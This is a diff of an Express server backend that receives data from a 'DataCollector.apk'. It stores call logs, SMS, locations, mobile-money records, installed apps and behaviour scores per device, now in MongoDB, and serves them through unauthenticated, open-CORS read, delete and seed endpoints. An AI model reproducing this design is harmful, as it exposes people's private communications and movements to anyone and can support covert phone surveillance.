@@ -3,6 +3,7 @@ const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
+const { MongoClient } = require('mongodb');
 
 const app = express();
 app.use(cors());
@@ -17,54 +18,194 @@ app.get('/DataCollector.apk', (req, res) => {
 express.static.mime.define({ 'application/vnd.android.package-archive': ['apk'] });
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ─── JSON File Database ────────────────────────────────────────────────────
+// ─── Constants ─────────────────────────────────────────────────────────────
 
-const BUNDLED_DB = path.join(__dirname, 'data.json');
-const TMP_DB = process.env.VERCEL ? '/tmp/data.json' : BUNDLED_DB;
+const VALID_TYPES = [
+  'call_logs', 'sms', 'location', 'sim_history',
+  'mobile_money', 'telecom_usage', 'ride_hailing',
+  'device_info', 'location_dwell', 'behavior_scores', 'installed_apps'
+];
 
-const EMPTY_DB = {
-  call_logs: [], sms: [], location: [], sim_history: [],
-  mobile_money: [], telecom_usage: [], ride_hailing: [],
-  device_info: [], location_dwell: [], behavior_scores: [], installed_apps: []
-};
+// ─── MongoDB Connection ───────────────────────────────────────────────────
 
-function loadDb() {
-  // On Vercel: copy bundled data to /tmp on first use
-  if (process.env.VERCEL && !fs.existsSync(TMP_DB) && fs.existsSync(BUNDLED_DB)) {
-    fs.copyFileSync(BUNDLED_DB, TMP_DB);
+let cachedClient = null;
+let cachedDb = null;
+
+async function getDatabase() {
+  const uri = process.env.MONGODB_URI;
+  if (!uri) return null;
+  if (cachedDb) return cachedDb;
+  cachedClient = new MongoClient(uri);
+  await cachedClient.connect();
+  cachedDb = cachedClient.db('datacollector');
+  return cachedDb;
+}
+
+// ─── Local File Fallback (for development) ────────────────────────────────
+
+const LOCAL_DB = path.join(__dirname, 'data.json');
+
+function loadLocalDb() {
+  if (!fs.existsSync(LOCAL_DB)) {
+    return Object.fromEntries(VALID_TYPES.map(t => [t, []]));
   }
-  const dbPath = fs.existsSync(TMP_DB) ? TMP_DB : BUNDLED_DB;
-  if (!fs.existsSync(dbPath)) return { ...EMPTY_DB };
-  const data = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
-  const defaults = Object.keys(EMPTY_DB);
-  defaults.forEach(k => { if (!data[k]) data[k] = []; });
+  const data = JSON.parse(fs.readFileSync(LOCAL_DB, 'utf8'));
+  VALID_TYPES.forEach(k => { if (!data[k]) data[k] = []; });
   return data;
 }
 
-function saveDb(db) {
-  fs.writeFileSync(TMP_DB, JSON.stringify(db, null, 2), 'utf8');
+function saveLocalDb(data) {
+  fs.writeFileSync(LOCAL_DB, JSON.stringify(data, null, 2), 'utf8');
+}
+
+// ─── Unified Data Operations ──────────────────────────────────────────────
+
+async function insertRecords(type, records) {
+  const db = await getDatabase();
+  if (db) {
+    if (records.length === 0) return 0;
+    const result = await db.collection(type).insertMany(records);
+    return result.insertedCount;
+  }
+  const local = loadLocalDb();
+  local[type].push(...records);
+  saveLocalDb(local);
+  return records.length;
+}
+
+async function queryRecords(type, { device_id, limit } = {}) {
+  const db = await getDatabase();
+  if (db) {
+    const filter = {};
+    if (device_id) filter.device_id = device_id;
+    let cursor = db.collection(type).find(filter).sort({ createdAt: -1 });
+    if (limit) cursor = cursor.limit(parseInt(limit));
+    return cursor.toArray();
+  }
+  const local = loadLocalDb();
+  let data = local[type] || [];
+  if (device_id) data = data.filter(r => r.device_id === device_id);
+  data.sort((a, b) => (b.createdAt || '').localeCompare(a.createdAt || ''));
+  if (limit) data = data.slice(0, parseInt(limit));
+  return data;
+}
+
+async function countRecords(type, device_id) {
+  const db = await getDatabase();
+  if (db) {
+    const filter = device_id ? { device_id } : {};
+    return db.collection(type).countDocuments(filter);
+  }
+  const local = loadLocalDb();
+  let data = local[type] || [];
+  if (device_id) data = data.filter(r => r.device_id === device_id);
+  return data.length;
+}
+
+async function deleteRecords(type, { id, device_id } = {}) {
+  const db = await getDatabase();
+  if (db) {
+    let filter = {};
+    if (id) filter._id = id;
+    else if (device_id) filter.device_id = device_id;
+    const result = await db.collection(type).deleteMany(filter);
+    return result.deletedCount;
+  }
+  const local = loadLocalDb();
+  const before = (local[type] || []).length;
+  if (id) local[type] = (local[type] || []).filter(r => r._id !== id);
+  else if (device_id) local[type] = (local[type] || []).filter(r => r.device_id !== device_id);
+  else local[type] = [];
+  saveLocalDb(local);
+  return before - local[type].length;
+}
+
+async function getDeviceStats() {
+  const db = await getDatabase();
+  const deviceMap = {};
+
+  if (db) {
+    for (const type of VALID_TYPES) {
+      const counts = await db.collection(type).aggregate([
+        { $match: { device_id: { $exists: true, $ne: null } } },
+        { $group: {
+          _id: '$device_id',
+          count: { $sum: 1 },
+          first_seen: { $min: '$createdAt' },
+          last_seen: { $max: '$createdAt' }
+        }}
+      ]).toArray();
+      counts.forEach(c => {
+        if (!deviceMap[c._id]) {
+          deviceMap[c._id] = {
+            device_id: c._id, first_seen: c.first_seen || '', last_seen: c.last_seen || '',
+            total_records: 0, ...Object.fromEntries(VALID_TYPES.map(t => [t, 0])),
+            brand: '', model: '', os_version: '', api_level: ''
+          };
+        }
+        const d = deviceMap[c._id];
+        d[type] = c.count;
+        d.total_records += c.count;
+        if (c.first_seen && (!d.first_seen || c.first_seen < d.first_seen)) d.first_seen = c.first_seen;
+        if (c.last_seen && (!d.last_seen || c.last_seen > d.last_seen)) d.last_seen = c.last_seen;
+      });
+    }
+    // Enrich with device brand/model
+    const deviceInfos = await db.collection('device_info').find({ device_id: { $exists: true } }).toArray();
+    deviceInfos.forEach(r => {
+      if (r.device_id && deviceMap[r.device_id]) {
+        const d = deviceMap[r.device_id];
+        if (r.brand) d.brand = r.brand;
+        if (r.model) d.model = r.model;
+        if (r.os_version) d.os_version = r.os_version;
+        if (r.api_level) d.api_level = r.api_level;
+      }
+    });
+  } else {
+    const local = loadLocalDb();
+    VALID_TYPES.forEach(type => {
+      (local[type] || []).forEach(r => {
+        if (!r.device_id) return;
+        if (!deviceMap[r.device_id]) {
+          deviceMap[r.device_id] = {
+            device_id: r.device_id, first_seen: r.createdAt || '', last_seen: r.createdAt || '',
+            total_records: 0, ...Object.fromEntries(VALID_TYPES.map(t => [t, 0])),
+            brand: '', model: '', os_version: '', api_level: ''
+          };
+        }
+        const d = deviceMap[r.device_id];
+        d.total_records++;
+        d[type] = (d[type] || 0) + 1;
+        if (r.createdAt && r.createdAt < d.first_seen) d.first_seen = r.createdAt;
+        if (r.createdAt && r.createdAt > d.last_seen) d.last_seen = r.createdAt;
+      });
+    });
+    (local.device_info || []).forEach(r => {
+      if (r.device_id && deviceMap[r.device_id]) {
+        const d = deviceMap[r.device_id];
+        if (r.brand) d.brand = r.brand;
+        if (r.model) d.model = r.model;
+        if (r.os_version) d.os_version = r.os_version;
+        if (r.api_level) d.api_level = r.api_level;
+      }
+    });
+  }
+
+  return Object.values(deviceMap).sort((a, b) => (b.last_seen || '').localeCompare(a.last_seen || ''));
 }
 
 // ─── Collect Endpoint ─────────────────────────────────────────────────────
 
-app.post('/api/collect', (req, res) => {
+app.post('/api/collect', async (req, res) => {
   try {
     const { type, data, device_id } = req.body;
-
     if (!type || !data || !Array.isArray(data)) {
       return res.status(400).json({ error: 'Invalid payload' });
     }
-
-    const validTypes = [
-      'call_logs', 'sms', 'location', 'sim_history',
-      'mobile_money', 'telecom_usage', 'ride_hailing',
-      'device_info', 'location_dwell', 'behavior_scores', 'installed_apps'
-    ];
-    if (!validTypes.includes(type)) {
+    if (!VALID_TYPES.includes(type)) {
       return res.status(400).json({ error: 'Unknown type: ' + type });
     }
 
-    const db = loadDb();
     const records = data.map(item => ({
       ...item,
       _id: crypto.randomUUID(),
@@ -72,12 +213,9 @@ app.post('/api/collect', (req, res) => {
       createdAt: new Date().toISOString()
     }));
 
-    db[type].push(...records);
-    saveDb(db);
-
-    console.log(`[${type}] ${records.length} records from device: ${device_id}`);
-    res.json({ success: true, inserted: records.length });
-
+    const count = await insertRecords(type, records);
+    console.log(`[${type}] ${count} records from device: ${device_id}`);
+    res.json({ success: true, inserted: count });
   } catch (err) {
     console.error('Error:', err.message);
     res.status(500).json({ error: err.message });
@@ -86,196 +224,105 @@ app.post('/api/collect', (req, res) => {
 
 // ─── View Data Endpoints ──────────────────────────────────────────────────
 
-function queryData(type, query) {
-  const db = loadDb();
-  let data = db[type] || [];
+const DEFAULT_LIMITS = {
+  call_logs: 500, sms: 500, location: 300,
+  mobile_money: 500, telecom_usage: 500, ride_hailing: 200,
+  location_dwell: 300, installed_apps: 500
+};
 
-  if (query.device_id) {
-    data = data.filter(r => r.device_id === query.device_id);
-  }
-
-  data.sort((a, b) => (b.createdAt || '').localeCompare(a.createdAt || ''));
-
-  const limit = parseInt(query.limit) || data.length;
-  data = data.slice(0, limit);
-
-  return data;
-}
-
-app.get('/api/data/call_logs', (req, res) => {
-  const data = queryData('call_logs', { ...req.query, limit: req.query.limit || 200 });
-  res.json({ count: data.length, data });
-});
-
-app.get('/api/data/sms', (req, res) => {
-  const data = queryData('sms', { ...req.query, limit: req.query.limit || 200 });
-  res.json({ count: data.length, data });
-});
-
-app.get('/api/data/location', (req, res) => {
-  const data = queryData('location', { ...req.query, limit: req.query.limit || 100 });
-  res.json({ count: data.length, data });
-});
-
-app.get('/api/data/sim_history', (req, res) => {
-  const data = queryData('sim_history', req.query);
-  res.json({ count: data.length, data });
-});
-
-app.get('/api/data/mobile_money', (req, res) => {
-  const data = queryData('mobile_money', { ...req.query, limit: req.query.limit || 500 });
-  res.json({ count: data.length, data });
-});
-
-app.get('/api/data/telecom_usage', (req, res) => {
-  const data = queryData('telecom_usage', { ...req.query, limit: req.query.limit || 500 });
-  res.json({ count: data.length, data });
-});
-
-app.get('/api/data/ride_hailing', (req, res) => {
-  const data = queryData('ride_hailing', { ...req.query, limit: req.query.limit || 200 });
-  res.json({ count: data.length, data });
-});
-
-app.get('/api/data/device_info', (req, res) => {
-  const data = queryData('device_info', req.query);
-  res.json({ count: data.length, data });
-});
-
-app.get('/api/data/location_dwell', (req, res) => {
-  const data = queryData('location_dwell', { ...req.query, limit: req.query.limit || 300 });
-  res.json({ count: data.length, data });
-});
-
-app.get('/api/data/behavior_scores', (req, res) => {
-  const data = queryData('behavior_scores', req.query);
-  res.json({ count: data.length, data });
-});
-
-app.get('/api/data/installed_apps', (req, res) => {
-  const data = queryData('installed_apps', { ...req.query, limit: req.query.limit || 500 });
-  res.json({ count: data.length, data });
+VALID_TYPES.forEach(type => {
+  app.get('/api/data/' + type, async (req, res) => {
+    try {
+      const limit = req.query.limit || DEFAULT_LIMITS[type];
+      const data = await queryRecords(type, { device_id: req.query.device_id, limit });
+      res.json({ count: data.length, data });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
 });
 
 // ─── Dashboard Summary ────────────────────────────────────────────────────
 
-app.get('/api/summary', (req, res) => {
-  const db = loadDb();
-  const filterDevice = req.query.device_id || '';
+app.get('/api/summary', async (req, res) => {
+  try {
+    const filterDevice = req.query.device_id || undefined;
+    const devices = await getDeviceStats();
+    const deviceIds = devices.map(d => d.device_id);
 
-  const allDevices = new Set();
-  const allTypes = [
-    'call_logs', 'sms', 'location', 'sim_history',
-    'mobile_money', 'telecom_usage', 'ride_hailing',
-    'device_info', 'location_dwell', 'behavior_scores', 'installed_apps'
-  ];
-  allTypes.forEach(type => {
-    (db[type] || []).forEach(r => { if (r.device_id) allDevices.add(r.device_id); });
-  });
+    const counts = {};
+    for (const type of VALID_TYPES) {
+      counts[type] = await countRecords(type, filterDevice);
+    }
 
-  const f = (arr) => {
-    if (!filterDevice) return arr || [];
-    return (arr || []).filter(r => r.device_id === filterDevice);
-  };
-
-  res.json({
-    total_call_logs: f(db.call_logs).length,
-    total_sms: f(db.sms).length,
-    total_locations: f(db.location).length,
-    total_sim_changes: f(db.sim_history).length,
-    total_mobile_money: f(db.mobile_money).length,
-    total_telecom_usage: f(db.telecom_usage).length,
-    total_ride_hailing: f(db.ride_hailing).length,
-    total_device_info: f(db.device_info).length,
-    total_location_dwell: f(db.location_dwell).length,
-    total_behavior_scores: f(db.behavior_scores).length,
-    total_installed_apps: f(db.installed_apps).length,
-    devices: allDevices.size,
-    device_ids: [...allDevices]
-  });
+    res.json({
+      total_call_logs: counts.call_logs,
+      total_sms: counts.sms,
+      total_locations: counts.location,
+      total_sim_changes: counts.sim_history,
+      total_mobile_money: counts.mobile_money,
+      total_telecom_usage: counts.telecom_usage,
+      total_ride_hailing: counts.ride_hailing,
+      total_device_info: counts.device_info,
+      total_location_dwell: counts.location_dwell,
+      total_behavior_scores: counts.behavior_scores,
+      total_installed_apps: counts.installed_apps,
+      devices: deviceIds.length,
+      device_ids: deviceIds
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // ─── Devices / Users List ─────────────────────────────────────────────────
 
-app.get('/api/devices', (req, res) => {
-  const db = loadDb();
-
-  const allTypes = [
-    'call_logs', 'sms', 'location', 'sim_history',
-    'mobile_money', 'telecom_usage', 'ride_hailing',
-    'device_info', 'location_dwell', 'behavior_scores', 'installed_apps'
-  ];
-
-  // Collect all device IDs
-  const deviceMap = {};
-  allTypes.forEach(type => {
-    (db[type] || []).forEach(r => {
-      if (!r.device_id) return;
-      if (!deviceMap[r.device_id]) {
-        deviceMap[r.device_id] = {
-          device_id: r.device_id,
-          first_seen: r.createdAt || '',
-          last_seen: r.createdAt || '',
-          total_records: 0,
-          call_logs: 0, sms: 0, location: 0, sim_history: 0,
-          mobile_money: 0, telecom_usage: 0, ride_hailing: 0,
-          device_info: 0, location_dwell: 0, behavior_scores: 0, installed_apps: 0,
-          brand: '', model: '', os_version: '', api_level: ''
-        };
-      }
-      const d = deviceMap[r.device_id];
-      d.total_records++;
-      d[type] = (d[type] || 0) + 1;
-      if (r.createdAt && r.createdAt < d.first_seen) d.first_seen = r.createdAt;
-      if (r.createdAt && r.createdAt > d.last_seen) d.last_seen = r.createdAt;
-    });
-  });
-
-  // Enrich with device_info (brand, model, etc.)
-  (db.device_info || []).forEach(r => {
-    if (r.device_id && deviceMap[r.device_id]) {
-      const d = deviceMap[r.device_id];
-      if (r.brand) d.brand = r.brand;
-      if (r.model) d.model = r.model;
-      if (r.os_version) d.os_version = r.os_version;
-      if (r.api_level) d.api_level = r.api_level;
-    }
-  });
-
-  const devices = Object.values(deviceMap).sort((a, b) => (b.last_seen || '').localeCompare(a.last_seen || ''));
-  res.json({ count: devices.length, devices });
+app.get('/api/devices', async (req, res) => {
+  try {
+    const devices = await getDeviceStats();
+    res.json({ count: devices.length, devices });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // ─── Delete Endpoint ───────────────────────────────────────────────────────
 
-app.delete('/api/delete', (req, res) => {
+app.delete('/api/delete', async (req, res) => {
   try {
     const { type, id, device_id } = req.query;
     if (!type) return res.status(400).json({ error: 'Missing type' });
-
-    const validTypes = [
-      'call_logs', 'sms', 'location', 'sim_history',
-      'mobile_money', 'telecom_usage', 'ride_hailing',
-      'device_info', 'location_dwell', 'behavior_scores', 'installed_apps'
-    ];
-    if (!validTypes.includes(type)) {
+    if (!VALID_TYPES.includes(type)) {
       return res.status(400).json({ error: 'Unknown type' });
     }
+    const deleted = await deleteRecords(type, { id, device_id });
+    res.json({ success: true, deleted });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
 
-    const db = loadDb();
-    const before = (db[type] || []).length;
+// ─── Seed: Migrate data.json → MongoDB ────────────────────────────────────
 
-    if (id) {
-      db[type] = (db[type] || []).filter(r => r._id !== id);
-    } else if (device_id) {
-      db[type] = (db[type] || []).filter(r => r.device_id !== device_id);
-    } else {
-      db[type] = [];
+app.post('/api/seed', async (req, res) => {
+  try {
+    const db = await getDatabase();
+    if (!db) return res.status(400).json({ error: 'MONGODB_URI not configured' });
+
+    const local = loadLocalDb();
+    let total = 0;
+
+    for (const type of VALID_TYPES) {
+      const records = local[type] || [];
+      if (records.length > 0) {
+        await db.collection(type).deleteMany({});
+        await db.collection(type).insertMany(records);
+        total += records.length;
+        console.log(`[seed] ${type}: ${records.length} records`);
+      }
     }
 
-    saveDb(db);
-    const deleted = before - (db[type] || []).length;
-    res.json({ success: true, deleted });
+    res.json({ success: true, message: `Seeded ${total} records to MongoDB` });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -286,6 +333,4 @@ app.delete('/api/delete', (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on http://0.0.0.0:${PORT}`);
-  console.log(`Admin panel: http://10.222.183.162:${PORT}`);
-  console.log(`API Collect: POST http://10.222.183.162:${PORT}/api/collect`);
 });
